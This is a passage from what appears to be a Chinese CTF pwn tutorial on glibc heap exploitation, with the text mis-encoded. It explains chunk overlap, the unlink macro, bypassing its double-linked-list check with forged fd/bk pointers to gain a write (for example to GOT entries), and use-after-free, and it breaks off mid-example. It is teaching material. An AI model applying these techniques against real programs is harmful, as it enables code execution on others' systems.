data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A824.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨24.png"></p><p>åœ¨ <code>malloc(0x150)</code> å¯¹ <code>extend</code> åŒºåŸŸé‡æ–°å ä½åï¼Œå°±å¯ä»¥å¾—åˆ°&nbsp;<code>chunk1 + chunk2 + chunk3 + chunk4</code> çš„å †å—</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A825.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨25.png"></p><p>å‰å‘ <code>extend</code> åˆ©ç”¨äº† <code>smallbin</code> çš„ unlink æœºåˆ¶ï¼Œé€šè¿‡ä¿®æ”¹ <code>pre_size</code> åŸŸå¯ä»¥è·¨è¶Šå¤šä¸ª <code>chunk</code> è¿›è¡Œåˆå¹¶å®ç° <code>Overlap</code></p><hr><h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><blockquote><p><code>unlink()</code> æ˜¯ Glibc ä¸­çš„ä¸€ä¸ªå®ï¼Œå…¶ç›®çš„æ˜¯å°†æŸä¸€ä¸ªç©ºé—² <code>chunk</code> ä»å…¶æ‰€å¤„çš„ <code>bin</code> ä¸­è„±é“¾</p><ul><li>åœ¨ <code>malloc_consolidate()</code> å‡½æ•°ä¸­ç”¨äºå°† <code>fast bin</code> ä¸­çš„ç©ºé—² <code>chunk</code> æ•´ç†åˆ° <code>unsorted bin</code></li><li>åœ¨ <code>malloc()</code> å‡½æ•°ä¸­ç”¨äºå°† <code>unsorted bin</code> ä¸­çš„ç©ºé—² <code>chunk</code> æ•´ç†åˆ° <code>small bin</code> æˆ–è€… <code>large bin</code>ï¼Œä»¥åŠåœ¨ <code>malloc()</code> ä¸­è·å¾—å †ç©ºé—´æ—¶ï¼Œå‡æœ‰å¯èƒ½è°ƒç”¨ <code>unlink()</code> å®</li></ul><p>å‚è€ƒæ–‡ç« ï¼š</p><ol><li><a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsv">Unlink - CTF Wiki</a></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Morphy_Amo/article/details/122631424">ã€pwnå­¦ä¹ ã€‘å †æº¢å‡ºï¼ˆä¸‰ï¼‰- Unlinkå’ŒUAF_pwn unlink-CSDNåšå®¢</a></li></ol></blockquote><p>åœ¨åˆ©ç”¨ unlink æ‰€é€ æˆçš„æ¼æ´æ—¶ï¼Œå…¶å®å°±æ˜¯å¯¹ <code>chunk</code> è¿›è¡Œå†…å­˜å¸ƒå±€ï¼Œç„¶åå€ŸåŠ© unlink æ“ä½œæ¥è¾¾æˆä¿®æ”¹æŒ‡é’ˆçš„æ•ˆæœ</p><p><code>unlink()</code> çš„å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>é¦–å…ˆæ ¹æ® <code>chunk P</code> çš„ <code>fd</code> å’Œ <code>bk</code> å‚æ•°ç¡®å®š <code>chunk P</code> åœ¨ <code>bin</code> ä¸­çš„å‰å <code>chunk</code> åˆ†åˆ«ä¸º <code>FD</code> å’Œ <code>BK</code></li><li>ç„¶åè®© <code>chunk FD</code> çš„ <code>bk</code> å‚æ•°æŒ‡å‘ <code>chunk BK</code></li><li>æœ€åè®© <code>chunk BK</code> çš„ <code>fd</code> å‚æ•°æŒ‡å‘ <code>chunk FD</code></li></ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A826.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨26.png"></p><hr><h2 id="æ²¡æœ‰é˜²æŠ¤çš„-unlink"><a href="#æ²¡æœ‰é˜²æŠ¤çš„-unlink" class="headerlink" title="æ²¡æœ‰é˜²æŠ¤çš„ unlink"></a>æ²¡æœ‰é˜²æŠ¤çš„ unlink</h2><blockquote><p>è¿™æ˜¯æ¯”è¾ƒå¤è€çš„ unlink åˆ©ç”¨æ–¹æ³•ï¼Œæ²¡æœ‰å¯¹ <code>chunk</code> çš„ <code>size</code> æ£€æŸ¥å’ŒåŒå‘é“¾è¡¨æ£€æŸ¥</p></blockquote><p>Glibc ä¸­æ²¡æœ‰é˜²æŠ¤çš„ <code>unlink()</code> å®å®šä¹‰ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                            </span></span>
    FD <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>   <span class="token comment">//è·å–æ˜¾å¼é“¾è¡¨ä¸­å‰ä¸€ä¸ªå— FD					      </span>
    BK <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>   <span class="token comment">//è·å–æ˜¾ç¤ºé“¾è¡¨ä¸­åä¸€ä¸ªå— BK              </span>
    FD<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>  <span class="token comment">//è®¾ç½®FDçš„åä¸€ä¸ªå—					      </span>
    BK<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>  <span class="token comment">//è®¾ç½®BKçš„å‰ä¸€ä¸ªå—</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡è®¾å †å†…å­˜æœ€åˆçš„å¸ƒå±€å¦‚å›¾ï¼ˆ32 ä½ç¨‹åºï¼‰ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A827.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨27.png"></p><p>ä¸Šå›¾ä¸­æœ‰ä¸¤ä¸ªç‰©ç†ç©ºé—´è¿ç»­çš„ <code>chunk</code>ï¼Œåˆ†åˆ«æ˜¯ <code>Q</code> å’Œ <code>Nextchunk</code>ï¼Œå¹¶ä¸” <code>Q</code> å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œ<code>Nextchunk</code> å¤„äºé‡Šæ”¾çŠ¶æ€</p><p>å¦‚æœæˆ‘ä»¬é€šè¿‡æŸç§æ–¹å¼ï¼ˆæ¯”å¦‚ï¼šæº¢å‡ºï¼‰å°† <code>Nextchunk</code> çš„ <code>fd</code> å’Œ <code>bk</code> æŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å®šçš„å€¼ï¼Œåˆ™å½“æˆ‘ä»¬ <code>free(Q)</code> æ—¶ï¼Œä¼šå‘ç”Ÿå¦‚ä¸‹æ­¥éª¤ï¼š</p><ol><li>Glibc åˆ¤æ–­ <code>chunk Q</code> æ˜¯ <code>small chunk</code></li><li>åˆ¤æ–­å‰å‘åˆå¹¶ï¼Œå‘ç°å‰ä¸€ä¸ª <code>chunk</code> å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œä¸éœ€è¦å‰å‘åˆå¹¶</li><li>åˆ¤æ–­åå‘åˆå¹¶ï¼Œå‘ç°åä¸€ä¸ª <code>chunk</code> å¤„äºç©ºé—²çŠ¶æ€ï¼Œéœ€è¦åˆå¹¶</li><li>ç»§è€Œå¯¹ <code>Nextchunk</code> é‡‡å– unlink æ“ä½œ</li></ol><p>æŒ‰ç…§å‰é¢æ‰€æåˆ°çš„ <code>unlink()</code> çš„å¤§è‡´æµç¨‹ï¼Œå¯ä»¥å°†è¯¥è¿‡ç¨‹æ€»ç»“å¦‚ä¸‹ï¼š</p><ol><li><code>FD = P -&gt; fd = target addr - 12</code></li><li><code>BK = P -&gt; bk = expect value</code></li><li><code>FD -&gt; bk = BK</code>ï¼Œå³ï¼š<code>*(target addr - 12 + 12) = BK = expect value</code></li><li><code>BK -&gt; fd = FD</code>ï¼Œå³ï¼š<code>*(expect value + 8) = FD = target addr - 12</code></li></ol><p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ unlink ç›´æ¥å®ç°ä»»æ„åœ°å€è¯»å†™çš„ç›®çš„ï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦ç¡®ä¿ <code>expect value + 8</code> çš„åœ°å€å¤„å…·æœ‰å¯å†™çš„æƒé™</p><blockquote><p>ä¾‹å¦‚å°† <code>target addr</code> è®¾ç½®ä¸ºæŸä¸ª GOT è¡¨é¡¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºè°ƒç”¨å¯¹åº”çš„ libc å‡½æ•°æ—¶ï¼Œå°±ä¼šç›´æ¥æ‰§è¡Œæˆ‘ä»¬è®¾ç½®çš„å€¼ <code>expect value</code> å¤„çš„ä»£ç </p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>expect value + 8</code> å¤„çš„å€¼è¢«ç ´åäº†ï¼Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡</strong></p></blockquote><hr><h2 id="å­˜åœ¨é˜²æŠ¤çš„-unlink"><a href="#å­˜åœ¨é˜²æŠ¤çš„-unlink" class="headerlink" title="å­˜åœ¨é˜²æŠ¤çš„ unlink"></a>å­˜åœ¨é˜²æŠ¤çš„ unlink</h2><blockquote><p>ç›®å‰çš„ unlink é€šå¸¸æ˜¯å­˜åœ¨æ£€æŸ¥çš„ï¼Œæ­¤æ—¶å°±æ²¡æœ‰é‚£ä¹ˆç®€å•äº†</p></blockquote><p>ç”±äº unlink çš„å±é™©æ€§ï¼ŒGlibc æ·»åŠ äº†ä¸€äº›æ£€æµ‹æœºåˆ¶ï¼Œå­˜åœ¨é˜²æŠ¤çš„ <code>unlink()</code> å®å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* Take a chunk off a bin list */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                            </span><span class="token punctuation">\</span>
    <span class="token expression">FD <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>								      </span><span class="token punctuation">\</span>
    <span class="token expression">BK <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>								      </span></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-&gt;</span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-&gt;</span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>		      \
      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \
    <span class="token keyword">else</span> <span class="token punctuation">{</span>								      \
        FD<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>							      \
        BK<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>							      \
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>size<span class="token punctuation">)</span>				      \
            <span class="token operator">&amp;&amp;</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>		      \
	    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>fd_nextsize<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>	      \
		<span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    \
	      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span>				      \
			       <span class="token string">"corrupted double-linked list (not small)"</span><span class="token punctuation">,</span>    \
			       P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>					      \
            <span class="token keyword">if</span> <span class="token punctuation">(</span>FD<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>				      \
                <span class="token keyword">if</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span>				      \
                  FD<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> FD<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>		      \
                <span class="token keyword">else</span> <span class="token punctuation">{</span>							      \
                    FD<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd_nextsize<span class="token punctuation">;</span>			      \
                    FD<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>			      \
                    P<span class="token operator">-&gt;</span>fd_nextsize<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>			      \
                    P<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>			      \
                  <span class="token punctuation">}</span>							      \
              <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>							      \
                P<span class="token operator">-&gt;</span>fd_nextsize<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>		      \
                P<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd_nextsize<span class="token punctuation">;</span>		      \
              <span class="token punctuation">}</span>								      \
          <span class="token punctuation">}</span>								      \
      <span class="token punctuation">}</span>									      \
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­ï¼Œå¯¹ <code>fd</code> å’Œ <code>bk</code> çš„æ£€æŸ¥ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// fd bk</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-&gt;</span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-&gt;</span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                      \
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæŒ‰ç…§æ²¡æœ‰é˜²æŠ¤çš„ unlink ä¸­æåˆ°çš„åœºæ™¯ï¼Œå½“å‰ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">FD <span class="token operator">-&gt;</span> bk <span class="token operator">=</span> target addr <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">=</span> target addr
BK <span class="token operator">-&gt;</span> fd <span class="token operator">=</span> expect value <span class="token operator">+</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½†åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¿®æ”¹ GOT è¡¨é¡¹çš„æ–¹æ³•å¯èƒ½å°±ä¸å¯ç”¨äº†</p><p>ä¸è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ªé€ çš„æ–¹å¼ç»•è¿‡è¿™ä¸ªæœºåˆ¶ï¼š</p><p>é¦–å…ˆé€šè¿‡è¦†ç›–ï¼Œå°† <code>Nextchunk</code> çš„ <code>FD</code> æŒ‡é’ˆæŒ‡å‘ <code>fakeFD</code>ï¼Œå°† <code>Nextchunk</code> çš„ <code>BK</code> æŒ‡é’ˆæŒ‡å‘ <code>fakeBK</code></p><p>ä¸ºäº†é€šè¿‡éªŒè¯ï¼Œéœ€è¦æ»¡è¶³ï¼š</p><ul><li><code>fakeFD -&gt; bk == P</code>ï¼Œå³ï¼š<code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code>ï¼Œå³ï¼š<code>*(fakeBK + 8) == P</code></li></ul><p>å½“æ»¡è¶³ä¸Šè¿°ä¸¤å¼æ—¶ï¼Œå¯ä»¥è¿›å…¥ unlink çš„ç¯èŠ‚ï¼Œè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code>ï¼Œå³ï¼š<code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code>ï¼Œå³ï¼š<code>*(fakeBK + 8) = fakeFD</code></li></ul><p>å¦‚æœè®© <code>fakeFD + 12</code> å’Œ <code>fakeBK + 8</code> æŒ‡å‘åŒä¸€ä¸ªæŒ‡å‘ P çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆï¼š</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>é€šè¿‡è¿™ç§æ–¹å¼ï¼ŒP çš„æŒ‡é’ˆæŒ‡å‘äº†æ¯”è‡ªå·±ä½ 12 çš„åœ°å€å¤„</p><blockquote><p>æ­¤æ–¹æ³•è™½ç„¶ä¸å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä½†æ˜¯å¯ä»¥ä¿®æ”¹æŒ‡å‘ <code>chunk</code> çš„æŒ‡é’ˆï¼Œè¿™æ ·çš„ä¿®æ”¹æ˜¯å¯ä»¥è¾¾åˆ°ä¸€å®šçš„æ•ˆæœçš„</p></blockquote><p>å¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿å¾—ä¸¤è€…éƒ½æŒ‡å‘ Pï¼Œåªéœ€è¦æŒ‰ç…§å¦‚ä¸‹æ–¹å¼ä¿®æ”¹å³å¯ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A828.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨28.png"></p><p>ç”±äº P åœ¨ unlink å‰æ˜¯æŒ‡å‘æ­£ç¡®çš„ <code>chunk</code> çš„æŒ‡é’ˆï¼Œå› æ­¤ä¸å—å¦‚ä¸‹æ£€æµ‹çš„å½±å“ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// ç”±äºPå·²ç»åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåœ°æ–¹è®°å½•å…¶å¤§å°ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹å…¶å¤§å°æ˜¯å¦ä¸€è‡´ã€‚</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span><span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>å¦‚æœæˆ‘ä»¬è®¾ç½® <code>Nextchunk</code> çš„ <code>fd</code> å’Œ <code>bk</code> å‡ä¸º <code>Nextchunk</code> çš„åœ°å€ä¹Ÿæ˜¯å¯ä»¥ç»•è¿‡ä¸Šé¢çš„æ£€æµ‹çš„</p><p>ä½†æ˜¯è¿™æ ·ä¸èƒ½è¾¾åˆ°ä¿®æ”¹æŒ‡é’ˆå†…å®¹çš„æ•ˆæœ</p></blockquote><hr><h2 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><p>åˆ©ç”¨ unlink æ¼æ´çš„æ¡ä»¶ï¼š</p><ol><li>å­˜åœ¨ UAF æ¼æ´ï¼Œå¯ä¿®æ”¹ <code>free</code> çŠ¶æ€ä¸‹ <code>small bin</code> æˆ–æ˜¯ <code>unsorted bin</code> çš„ <code>fd</code> å’Œ <code>bk</code> æŒ‡é’ˆ</li><li>å·²çŸ¥ä½ç½®å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¯è¿›è¡Œ UAF çš„ <code>chunk</code></li></ol><p>å®ç°çš„æ•ˆæœï¼šä½¿å¾—å·²æŒ‡å‘å­˜åœ¨ UAF æ¼æ´çš„ <code>chunk</code> çš„æŒ‡é’ˆ <code>ptr</code> å˜ä¸º <code>ptr - 0x18</code></p><p>å‡è®¾æŒ‡å‘å­˜åœ¨ UAF æ¼æ´çš„ <code>chunk</code> çš„æŒ‡é’ˆçš„åœ°å€ä¸º <code>ptr</code>ï¼Œåˆ™å®ç°çš„ä¸»è¦æ­¥éª¤ä¸ºï¼š</p><ol><li>ä¿®æ”¹ <code>fd</code> ä¸º <code>ptr - 0x18</code></li><li>ä¿®æ”¹ <code>bk</code> ä¸º <code>ptr - 0x10</code></li><li>è§¦å‘ unlinkï¼Œ<code>ptr</code> å¤„çš„æŒ‡é’ˆä¼šå˜ä¸º <code>ptr - 0x18</code></li></ol><hr><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><blockquote><p>Use After Free ç®€ç§° UAFï¼Œå³ï¼šé‡Šæ”¾åä½¿ç”¨æ¼æ´ï¼ŒæŒ‡ä¸€ä¸ªå†…å­˜å—è¢«é‡Šæ”¾ä¹‹åå†æ¬¡è¢«ä½¿ç”¨</p></blockquote><p>å¯¹äºå†…å­˜å—é‡Šæ”¾ä¹‹åçš„æ“ä½œï¼Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š</p><ol><li><p><strong>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULL</strong>ï¼Œç„¶åå†æ¬¡ä½¿ç”¨ï¼Œè‡ªç„¶ç¨‹åºä¼šå´©æºƒ</p></li><li><p><strong>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL</strong>ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œ<em>æ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹</em>ï¼Œé‚£ä¹ˆç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬</p></li><li><p><strong>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL</strong>ï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œ<em>æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œäº†ä¿®æ”¹</em>ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜</p></li></ol><p>é€šå¸¸æˆ‘ä»¬æ‰€è¯´çš„ UAF æ¼æ´å¯¹åº”çš„å°±æ˜¯ 2 å’Œ 3</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<em>UAF æ¼æ´åˆ©ç”¨çš„å‰ææ˜¯ï¼šå†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL</em></p><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">name</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>myname<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> NAME<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">myprint</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">printmyname</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"call print my name\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  NAME <span class="token operator">*</span>a<span class="token punctuation">;</span>
  a <span class="token operator">=</span> <span class="token punctuation">(</span>NAME <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a <span class="token operator">-&gt;</span> func <span class="token operator">=</span> myprint<span class="token punctuation">;</span>
